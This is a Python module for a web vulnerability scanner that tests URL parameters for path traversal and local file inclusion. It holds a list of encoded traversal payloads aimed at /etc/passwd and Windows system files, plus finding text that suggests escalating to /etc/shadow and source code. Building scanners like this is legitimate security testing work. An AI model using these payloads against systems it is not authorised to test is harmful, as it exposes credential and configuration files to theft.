"""Path Traversal / LFI Scanner"""
from __future__ import annotations
import asyncio, re
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd", "....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
]

# Signatures must correspond to files that payloads actually target
SUCCESS_SIGS = [r"root:x:0:0", r"root:.*:/bin/(bash|sh)", r"\[fonts\]", r"\[extensions\]",
                r"localhost", r"127\.0\.0\.1"]

TRAVERSAL_PARAMS = ["file","path","page","template","include","doc","document",
    "filename","filepath","folder","dir","load","read","view","resource"]

class PathTraversalScanner(BaseScanner):
    name = "path_traversal"
    description = "Detects Path Traversal / LFI"
    tags = ["file", "lfi", "owasp-a01"]

    async def run(self, state: ScanState) -> List[Finding]:
        tasks = [self._test(url, param, payload)
                 for url, params in state.target.discovered_params.items()
                 for param in params if param.lower() in TRAVERSAL_PARAMS
                 for payload in TRAVERSAL_PAYLOADS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, Finding)]

    async def _test(self, url, param, payload):
        resp, raw_req = await self.test_payload(url, "GET", param, payload, inject_in="query")
        if not resp: return None
        for sig in SUCCESS_SIGS:
            m = re.search(sig, resp.text)
            if m:
                return self.make_finding(
                    title=f"Path Traversal / LFI in '{param}'",
                    vuln_type="path_traversal", severity=Severity.HIGH,
                    url=url, parameter=param, payload=payload, evidence=m.group(0),
                    request=raw_req, response=resp.text[:500],
                    cwe_id="CWE-22", owasp_category="A01:2021 - Broken Access Control",
                    description=f"Parameter '{param}' allows reading arbitrary files.",
                    poc_steps=[
                        f"1. Set '{param}' to {payload}",
                        f"2. Observe file content in response: {m.group(0)}",
                        "3. Escalate: read /etc/shadow, config files, source code",
                    ],
                )
        return None
